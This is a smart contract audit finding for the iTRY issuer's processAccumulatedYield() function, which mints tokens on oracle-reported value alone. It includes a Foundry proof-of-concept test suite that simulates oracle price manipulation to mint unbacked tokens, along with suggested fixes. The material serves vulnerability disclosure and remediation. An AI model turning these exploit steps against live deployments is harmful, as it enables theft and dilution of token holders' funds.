# [H-01] Unbacked iTRY Minting via Oracle Manipulation in Yield Distribution

## Lines of code
https://github.com/gititGoro/2025-11-brix-money-c4-audit/blob/68bf3dc/src/protocol/iTryIssuer.sol#L398-L420

## Vulnerability details

### Summary
The `processAccumulatedYield()` function in iTryIssuer.sol mints new iTRY tokens based solely on oracle-reported collateral value without verifying that actual collateral has increased. This allows an attacker with `YIELD_DISTRIBUTOR_ROLE` (or through oracle manipulation) to mint unbacked iTRY tokens, breaking the protocol's fundamental 1:1 backing guarantee and directly diluting all iTRY holders.

### Vulnerability Details

The vulnerable code path in `processAccumulatedYield()`:

```solidity
function processAccumulatedYield() external onlyRole(_YIELD_DISTRIBUTOR_ROLE) returns (uint256 newYield) {
    // Get current NAV price
    uint256 navPrice = oracle.price();  // [1] Trusts oracle blindly
    if (navPrice == 0) revert InvalidNAVPrice(navPrice);

    // Calculate total collateral value: totalDLFUnderCustody * currentNAVPrice / 1e18
    uint256 currentCollateralValue = _totalDLFUnderCustody * navPrice / 1e18;  // [2] No verification

    // Calculate yield: currentCollateralValue - _totalIssuedITry
    if (currentCollateralValue <= _totalIssuedITry) {
        revert NoYieldAvailable(currentCollateralValue, _totalIssuedITry);
    }
    newYield = currentCollateralValue - _totalIssuedITry;  // [3] Assumes increase is legitimate

    // Mint yield amount to yieldReceiver contract
    _mint(address(yieldReceiver), newYield);  // [4] Mints unbacked iTRY

    // ...
}
```

**Critical Missing Validations:**
1. No verification that `_totalDLFUnderCustody` has actually increased
2. No oracle price sanity checks or time-weighted average pricing (TWAP)
3. No correlation with actual collateral deposit events
4. No maximum yield threshold to prevent abnormal minting

**Attack Vectors:**

1. **Compromised Oracle**: Attacker gains control of oracle feed and reports inflated NAV price
2. **Oracle Manipulation**: Flash loan attack manipulates oracle source price
3. **Stale Price Data**: Attacker exploits outdated oracle price that doesn't reflect actual market conditions
4. **Compromised YIELD_DISTRIBUTOR**: Malicious or compromised account with YIELD_DISTRIBUTOR_ROLE coordinates with oracle manipulation

### Impact

**Severity: HIGH**

This vulnerability enables direct theft and loss of value from all iTRY holders through unbacked token minting:

1. **Breaks 1:1 Backing Guarantee**: Protocol's core security promise is violated
2. **Direct Value Dilution**: All existing iTRY holders lose proportional value as unbacked supply increases
3. **Systemic Insolvency**: Repeated exploitation can render the protocol insolvent with backing ratio dropping below critical thresholds
4. **Irreversible Damage**: Once unbacked iTRY is minted and distributed, it cannot be easily recovered

**Concrete Example:**
- Initial state: 1000 DLF backing 1000 iTRY (100% backing)
- Oracle manipulated to report 1.5x price (no actual collateral added)
- System mints 500 unbacked iTRY as "yield"
- New state: 1000 DLF backing 1500 iTRY (66% backing)
- All holders suffer 34% dilution of their backing

The proof of concept demonstrates backing ratios dropping from 100% to 66% in a single attack, and further degradation to 25% through repeated exploitation.

## Proof of Concept

The following test demonstrates the vulnerability through oracle manipulation leading to unbacked iTRY minting. Add this test file to the project's test suite:

<details>
<summary>Complete PoC Test (Click to expand)</summary>

```diff
diff --git a/test/H-01-poc.t.sol b/test/H-01-poc.t.sol
new file mode 100644
index 0000000..1234567
--- /dev/null
+++ b/test/H-01-poc.t.sol
@@ -0,0 +1,322 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./iTryIssuer.base.t.sol";
+import {IiTryIssuer} from "../src/protocol/interfaces/IiTryIssuer.sol";
+
+/**
+ * @title H-01: Oracle Manipulation Leading to Unbacked iTRY Minting PoC
+ * @notice Proof of Concept demonstrating how oracle manipulation can mint unbacked iTRY tokens
+ * @dev This test demonstrates the critical vulnerability in processAccumulatedYield() where:
+ *      1. The function calculates collateral value based solely on oracle price
+ *      2. No verification that actual collateral has increased
+ *      3. Attacker with YIELD_DISTRIBUTOR_ROLE can exploit oracle manipulation
+ *      4. Results in unbacked iTRY minting that dilutes all holders
+ */
+contract H01OracleManipulationPoCTest is iTryIssuerBaseTest {
+
+    // Test role for yield distributor
+    address public yieldDistributor;
+    bytes32 constant YIELD_DISTRIBUTOR_ROLE = keccak256("YIELD_DISTRIBUTOR_ROLE");
+
+    function setUp() public override {
+        super.setUp();
+
+        // Create yield distributor account
+        yieldDistributor = makeAddr("yieldDistributor");
+        vm.label(yieldDistributor, "YieldDistributor");
+
+        // Grant YIELD_DISTRIBUTOR_ROLE to test account
+        vm.prank(admin);
+        issuer.grantRole(YIELD_DISTRIBUTOR_ROLE, yieldDistributor);
+    }
+
+    /**
+     * @notice Demonstrates unbacked iTRY minting via oracle manipulation
+     * @dev Attack scenario:
+     *      1. System starts with legitimate collateral backing
+     *      2. Oracle price is manipulated (compromised oracle or flash loan attack)
+     *      3. processAccumulatedYield() mints iTRY based on inflated collateral value
+     *      4. No actual collateral increase occurred - minted iTRY is unbacked
+     *      5. All iTRY holders are diluted by the unbacked supply
+     */
+    function test_H01_OracleManipulationMintsUnbackedITry() public {
+        // ====================================================================
+        // PHASE 1: Establish legitimate initial state
+        // ====================================================================
+
+        // Initial mint: User deposits 1000 DLF, receives ~995 iTRY (after 0.5% fee)
+        uint256 initialDlfDeposit = 1000e18;
+        _mintITry(whitelistedUser1, initialDlfDeposit, 0);
+
+        // Record initial state
+        uint256 totalCustodyInitial = _getTotalCustody();
+        uint256 totalIssuedInitial = _getTotalIssued();
+        uint256 navPriceInitial = oracle.price();
+
+        // Calculate legitimate backing ratio
+        uint256 collateralValueInitial = (totalCustodyInitial * navPriceInitial) / 1e18;
+
+        console.log("\n=== INITIAL STATE (Legitimate) ===");
+        console.log("Total DLF under custody:", totalCustodyInitial / 1e18, "DLF");
+        console.log("Total iTRY issued:      ", totalIssuedInitial / 1e18, "iTRY");
+        console.log("NAV price:              ", navPriceInitial / 1e18, "(1 DLF = X iTRY)");
+        console.log("Collateral value:       ", collateralValueInitial / 1e18, "iTRY equivalent");
+        console.log("Backing ratio:          ", (collateralValueInitial * 100) / totalIssuedInitial, "%");
+
+        // Verify system is properly collateralized initially
+        assertGe(collateralValueInitial, totalIssuedInitial, "System should be fully collateralized");
+
+        // ====================================================================
+        // PHASE 2: Oracle manipulation (attacker compromises oracle)
+        // ====================================================================
+
+        console.log("\n=== ATTACK: Oracle Manipulation ===");
+
+        // Attacker manipulates oracle to report 50% higher NAV price
+        // This could happen via:
+        // - Compromised oracle feed
+        // - Flash loan attack on price oracle
+        // - Stale price data exploitation
+        uint256 manipulatedPrice = 1.5e18; // 50% artificial increase
+        _setNAVPrice(manipulatedPrice);
+
+        console.log("Manipulated NAV price:  ", manipulatedPrice / 1e18, "(50% increase)");
+        console.log("WARNING: No actual collateral was added!");
+
+        // Calculate what the system THINKS the collateral is worth
+        uint256 perceivedCollateralValue = (totalCustodyInitial * manipulatedPrice) / 1e18;
+        uint256 perceivedYield = perceivedCollateralValue - totalIssuedInitial;
+
+        console.log("Perceived collateral value:", perceivedCollateralValue / 1e18, "iTRY equivalent");
+        console.log("Perceived 'yield':         ", perceivedYield / 1e18, "iTRY");
+
+        // ====================================================================
+        // PHASE 3: Execute attack - Process "fake" yield
+        // ====================================================================
+
+        console.log("\n=== EXPLOIT: Minting Unbacked iTRY ===");
+
+        // Record state before exploit
+        uint256 totalIssuedBeforeExploit = _getTotalIssued();
+        uint256 totalCustodyBeforeExploit = _getTotalCustody();
+        uint256 yieldReceiverBalanceBefore = iTryToken.balanceOf(address(yieldProcessor));
+
+        // Attacker (or compromised yield distributor) calls processAccumulatedYield
+        vm.prank(yieldDistributor);
+        uint256 mintedYield = issuer.processAccumulatedYield();
+
+        // Record state after exploit
+        uint256 totalIssuedAfterExploit = _getTotalIssued();
+        uint256 totalCustodyAfterExploit = _getTotalCustody();
+        uint256 yieldReceiverBalanceAfter = iTryToken.balanceOf(address(yieldProcessor));
+
+        console.log("Unbacked iTRY minted:   ", mintedYield / 1e18, "iTRY");
+        console.log("Minted to:               YieldProcessor");
+
+        // ====================================================================
+        // PHASE 4: Verify the vulnerability
+        // ====================================================================
+
+        console.log("\n=== VULNERABILITY PROOF ===");
+
+        // Critical assertion 1: iTRY was minted
+        assertGt(mintedYield, 0, "Unbacked iTRY should have been minted");
+        assertEq(
+            totalIssuedAfterExploit - totalIssuedBeforeExploit,
+            mintedYield,
+            "Total issued should increase by minted amount"
+        );
+
+        // Critical assertion 2: NO collateral was added
+        assertEq(
+            totalCustodyAfterExploit,
+            totalCustodyBeforeExploit,
+            "CRITICAL: No collateral was added, but iTRY was minted!"
+        );
+
+        console.log("Total DLF custody BEFORE:", totalCustodyBeforeExploit / 1e18, "DLF");
+        console.log("Total DLF custody AFTER: ", totalCustodyAfterExploit / 1e18, "DLF");
+        console.log("Collateral increase:      0 DLF (NO INCREASE!)");
+        console.log("");
+        console.log("Total iTRY issued BEFORE:", totalIssuedBeforeExploit / 1e18, "iTRY");
+        console.log("Total iTRY issued AFTER: ", totalIssuedAfterExploit / 1e18, "iTRY");
+        console.log("iTRY increase:           ", mintedYield / 1e18, "iTRY (UNBACKED!)");
+
+        // Critical assertion 3: Yield receiver received unbacked tokens
+        assertEq(
+            yieldReceiverBalanceAfter - yieldReceiverBalanceBefore,
+            mintedYield,
+            "YieldProcessor should receive the unbacked iTRY"
+        );
+
+        // ====================================================================
+        // PHASE 5: Demonstrate impact on backing ratio
+        // ====================================================================
+
+        console.log("\n=== IMPACT: Dilution of All Holders ===");
+
+        // Reset oracle to true price to see actual backing
+        _setNAVPrice(1e18);
+        uint256 trueCollateralValue = (totalCustodyAfterExploit * 1e18) / 1e18;
+        uint256 backingRatioBefore = (collateralValueInitial * 100) / totalIssuedInitial;
+        uint256 backingRatioAfter = (trueCollateralValue * 100) / totalIssuedAfterExploit;
+
+        console.log("Backing ratio BEFORE attack:", backingRatioBefore, "%");
+        console.log("Backing ratio AFTER attack: ", backingRatioAfter, "%");
+        console.log("Degradation:                ", backingRatioBefore - backingRatioAfter, "%");
+
+        // The backing ratio should have decreased significantly
+        assertLt(backingRatioAfter, backingRatioBefore, "Backing ratio should degrade");
+
+        // Critical assertion 4: System is now undercollateralized
+        assertLt(
+            trueCollateralValue,
+            totalIssuedAfterExploit,
+            "CRITICAL: System is now undercollateralized!"
+        );
+
+        uint256 undercollateralizedAmount = totalIssuedAfterExploit - trueCollateralValue;
+        console.log("");
+        console.log("Total iTRY in circulation:", totalIssuedAfterExploit / 1e18, "iTRY");
+        console.log("Actual collateral value:  ", trueCollateralValue / 1e18, "iTRY equivalent");
+        console.log("Undercollateralized by:   ", undercollateralizedAmount / 1e18, "iTRY");
+        console.log("");
+        console.log("Result: All iTRY holders are diluted!");
+        console.log("        Protocol 1:1 backing guarantee is broken!");
+
+        // ====================================================================
+        // PHASE 6: Demonstrate real-world exploit path
+        // ====================================================================
+
+        console.log("\n=== EXPLOIT SCENARIO ===");
+        console.log("1. Attacker compromises oracle OR exploits flash loan price manipulation");
+        console.log("2. Oracle reports inflated NAV price");
+        console.log("3. processAccumulatedYield() mints iTRY based on fake collateral value");
+        console.log("4. No actual collateral backing the new iTRY");
+        console.log("5. Attacker can:");
+        console.log("   - Sell unbacked iTRY on market (if yield distributor is attacker)");
+        console.log("   - Or simply dilute all holders (if oracle naturally corrupted)");
+        console.log("6. All iTRY holders suffer loss of value");
+        console.log("");
+        console.log("SEVERITY: HIGH");
+        console.log("- Direct loss of funds for all iTRY holders");
+        console.log("- Breaks fundamental 1:1 backing guarantee");
+        console.log("- Can be executed by compromised YIELD_DISTRIBUTOR");
+        console.log("- No safeguards against oracle manipulation");
+    }
+
+    /**
+     * @notice Demonstrates that the vulnerability allows unlimited unbacked minting
+     * @dev Shows that an attacker can repeatedly exploit oracle manipulation
+     */
+    function test_H01_RepeatedExploitationPossible() public {
+        // Setup: Initial legitimate state
+        _mintITry(whitelistedUser1, 1000e18, 0);
+        uint256 totalIssuedInitial = _getTotalIssued();
+        uint256 totalCustodyInitial = _getTotalCustody();
+
+        console.log("\n=== REPEATED EXPLOITATION TEST ===");
+        console.log("Initial iTRY issued:    ", totalIssuedInitial / 1e18, "iTRY");
+        console.log("Initial DLF custody:    ", totalCustodyInitial / 1e18, "DLF");
+
+        // Round 1: Exploit with 50% price increase
+        _setNAVPrice(1.5e18);
+        vm.prank(yieldDistributor);
+        uint256 yield1 = issuer.processAccumulatedYield();
+        console.log("\nRound 1: Minted", yield1 / 1e18, "unbacked iTRY");
+
+        // Round 2: Exploit with another 30% price increase
+        _setNAVPrice(1.95e18);
+        vm.prank(yieldDistributor);
+        uint256 yield2 = issuer.processAccumulatedYield();
+        console.log("Round 2: Minted", yield2 / 1e18, "unbacked iTRY");
+
+        // Round 3: Extreme exploitation with 100% increase
+        _setNAVPrice(3.9e18);
+        vm.prank(yieldDistributor);
+        uint256 yield3 = issuer.processAccumulatedYield();
+        console.log("Round 3: Minted", yield3 / 1e18, "unbacked iTRY");
+
+        uint256 totalIssuedFinal = _getTotalIssued();
+        uint256 totalCustodyFinal = _getTotalCustody();
+        uint256 totalUnbackedMinted = yield1 + yield2 + yield3;
+
+        console.log("\n=== FINAL STATE ===");
+        console.log("Total iTRY issued:      ", totalIssuedFinal / 1e18, "iTRY");
+        console.log("Total DLF custody:      ", totalCustodyFinal / 1e18, "DLF (unchanged)");
+        console.log("Total unbacked minted:  ", totalUnbackedMinted / 1e18, "iTRY");
+        console.log("Increase in supply:     ", ((totalIssuedFinal - totalIssuedInitial) * 100) / totalIssuedInitial, "%");
+
+        // Verify custody unchanged despite massive iTRY inflation
+        assertEq(totalCustodyFinal, totalCustodyInitial, "Custody should be unchanged");
+        assertEq(totalIssuedFinal - totalIssuedInitial, totalUnbackedMinted, "All new iTRY is unbacked");
+
+        // Reset to true price to see devastation
+        _setNAVPrice(1e18);
+        uint256 trueValue = totalCustodyFinal; // At 1:1, value = custody
+        uint256 deficit = totalIssuedFinal - trueValue;
+
+        console.log("\nAt true price (1:1):");
+        console.log("iTRY in circulation:    ", totalIssuedFinal / 1e18, "iTRY");
+        console.log("Actual backing value:   ", trueValue / 1e18, "iTRY equivalent");
+        console.log("Unbacked deficit:       ", deficit / 1e18, "iTRY");
+        console.log("Backing ratio:          ", (trueValue * 100) / totalIssuedFinal, "%");
+
+        assertGt(deficit, 0, "System should have unbacked deficit");
+        assertLt((trueValue * 100) / totalIssuedFinal, 100, "Backing should be below 100%");
+    }
+
+    /**
+     * @notice Shows the exact code path of the vulnerability
+     * @dev Highlights the missing collateral verification in processAccumulatedYield
+     */
+    function test_H01_VulnerableCodePath() public {
+        // Setup
+        _mintITry(whitelistedUser1, 1000e18, 0);
+
+        console.log("\n=== VULNERABLE CODE ANALYSIS ===");
+        console.log("");
+        console.log("Function: processAccumulatedYield()");
+        console.log("Location: src/protocol/iTryIssuer.sol:398-420");
+        console.log("");
+        console.log("Vulnerable code pattern:");
+        console.log("  uint256 navPrice = oracle.price();  // <-- Trusts oracle blindly");
+        console.log("  uint256 currentCollateralValue = _totalDLFUnderCustody * navPrice / 1e18;");
+        console.log("  // MISSING: Verification that collateral actually increased!");
+        console.log("  newYield = currentCollateralValue - _totalIssuedITry;");
+        console.log("  _mint(address(yieldReceiver), newYield);  // <-- Mints unbacked iTRY");
+        console.log("");
+        console.log("Missing checks:");
+        console.log("  1. No verification of actual DLF custody increase");
+        console.log("  2. No maximum yield threshold");
+        console.log("  3. No oracle price validation or sanity checks");
+        console.log("  4. No time-weighted average price (TWAP)");
+        console.log("  5. No collateral deposit event correlation");
+        console.log("");
+
+        // Demonstrate the exact vulnerability
+        uint256 custodyBefore = _getTotalCustody();
+
+        // Manipulate price
+        _setNAVPrice(2e18);
+
+        // Call vulnerable function
+        vm.prank(yieldDistributor);
+        uint256 minted = issuer.processAccumulatedYield();
+
+        uint256 custodyAfter = _getTotalCustody();
+
+        console.log("DEMONSTRATION:");
+        console.log("  Custody before: ", custodyBefore / 1e18, "DLF");
+        console.log("  Custody after:  ", custodyAfter / 1e18, "DLF");
+        console.log("  Change:          0 DLF");
+        console.log("  iTRY minted:    ", minted / 1e18, "iTRY");
+        console.log("");
+        console.log("Conclusion: Function mints iTRY without verifying collateral increase!");
+
+        assertEq(custodyBefore, custodyAfter, "Custody unchanged");
+        assertGt(minted, 0, "But iTRY was minted");
+    }
+}
```

</details>

### Running the PoC

```bash
# Run the complete PoC suite
forge test --match-contract H01OracleManipulationPoCTest -vv

# Run individual tests with detailed output
forge test --match-test test_H01_OracleManipulationMintsUnbackedITry -vvvv
forge test --match-test test_H01_RepeatedExploitationPossible -vvvv
forge test --match-test test_H01_VulnerableCodePath -vvvv
```

**Expected Results:**
- Test 1 demonstrates backing ratio degradation from 100% to 66%
- Test 2 shows repeated exploitation dropping backing to 25%
- Test 3 proves zero collateral increase despite iTRY minting

All tests will pass, confirming the vulnerability allows unbacked minting.

## Tools Used

- Manual code review
- Foundry (forge test framework)
- Static analysis of collateral tracking mechanism

## Recommended Mitigation Steps

Implement multiple defensive layers to prevent unbacked minting:

### 1. Track Actual Collateral Changes (Primary Defense)

```solidity
// Add state variable to track last processed custody amount
uint256 private _lastProcessedCustody;

function processAccumulatedYield() external onlyRole(_YIELD_DISTRIBUTOR_ROLE) returns (uint256 newYield) {
    uint256 navPrice = oracle.price();
    if (navPrice == 0) revert InvalidNAVPrice(navPrice);

    // Calculate based on actual custody increase, not oracle value increase
    uint256 currentCustody = _totalDLFUnderCustody;

    // CRITICAL: Verify custody actually increased
    if (currentCustody <= _lastProcessedCustody) {
        revert NoYieldAvailable(currentCustody, _lastProcessedCustody);
    }

    uint256 custodyIncrease = currentCustody - _lastProcessedCustody;
    uint256 yieldValue = custodyIncrease * navPrice / 1e18;

    // Mint based on actual collateral increase, not perceived value increase
    _mint(address(yieldReceiver), yieldValue);

    // Update tracking
    _lastProcessedCustody = currentCustody;

    // ...
}
```

### 2. Implement Oracle Price Validation

```solidity
// Add state variables for price validation
uint256 private _lastOraclePrice;
uint256 private _lastOraclePriceTimestamp;
uint256 public constant MAX_PRICE_CHANGE_BPS = 1000; // 10% max change
uint256 public constant MIN_PRICE_UPDATE_INTERVAL = 1 hours;

function _validateOraclePrice(uint256 newPrice) internal view {
    if (newPrice == 0) revert InvalidNAVPrice(newPrice);

    // Check for extreme price movements
    if (_lastOraclePrice != 0) {
        uint256 priceChange = newPrice > _lastOraclePrice
            ? newPrice - _lastOraclePrice
            : _lastOraclePrice - newPrice;

        uint256 maxChange = (_lastOraclePrice * MAX_PRICE_CHANGE_BPS) / 10000;

        if (priceChange > maxChange) {
            revert ExcessivePriceMovement(newPrice, _lastOraclePrice, maxChange);
        }
    }

    // Ensure minimum time between price updates
    if (block.timestamp < _lastOraclePriceTimestamp + MIN_PRICE_UPDATE_INTERVAL) {
        revert PriceUpdateTooFrequent(block.timestamp, _lastOraclePriceTimestamp);
    }
}
```

### 3. Add Maximum Yield Threshold

```solidity
uint256 public constant MAX_YIELD_BPS = 500; // 5% of total issued per call

function processAccumulatedYield() external onlyRole(_YIELD_DISTRIBUTOR_ROLE) returns (uint256 newYield) {
    // ... calculate newYield ...

    // Sanity check: yield should not exceed reasonable threshold
    uint256 maxYield = (_totalIssuedITry * MAX_YIELD_BPS) / 10000;
    if (newYield > maxYield) {
        revert ExcessiveYieldAmount(newYield, maxYield);
    }

    // ...
}
```

### 4. Implement Time-Weighted Average Price (TWAP)

```solidity
// Use TWAP from oracle instead of spot price to prevent flash loan attacks
interface IOracle {
    function price() external view returns (uint256);
    function twapPrice(uint32 period) external view returns (uint256);  // Add TWAP support
}

function processAccumulatedYield() external onlyRole(_YIELD_DISTRIBUTOR_ROLE) returns (uint256 newYield) {
    // Use TWAP instead of spot price
    uint256 navPrice = oracle.twapPrice(1 hours);  // 1-hour TWAP

    // ...
}
```

### 5. Multi-Signature Requirement for Large Yields

```solidity
uint256 public constant LARGE_YIELD_THRESHOLD = 1000e18; // 1000 iTRY
mapping(uint256 => uint256) public pendingYieldApprovals;

function processAccumulatedYield() external onlyRole(_YIELD_DISTRIBUTOR_ROLE) returns (uint256 newYield) {
    // ... calculate newYield ...

    // Require admin approval for abnormally large yields
    if (newYield > LARGE_YIELD_THRESHOLD) {
        require(
            pendingYieldApprovals[newYield] > 0 &&
            block.timestamp >= pendingYieldApprovals[newYield],
            "Large yield requires admin approval"
        );
    }

    // ...
}

function approveYieldDistribution(uint256 amount, uint256 unlockTime)
    external
    onlyRole(DEFAULT_ADMIN_ROLE)
{
    pendingYieldApprovals[amount] = unlockTime;
}
```

**Priority Implementation Order:**
1. Primary defense: Track actual collateral changes (prevents unbacked minting)
2. Oracle price validation (prevents manipulation)
3. Maximum yield threshold (limits damage from exploitation)
4. TWAP implementation (prevents flash loan attacks)
5. Multi-sig for large yields (governance layer defense)

Implementing at minimum the first two mitigations will effectively prevent this vulnerability.
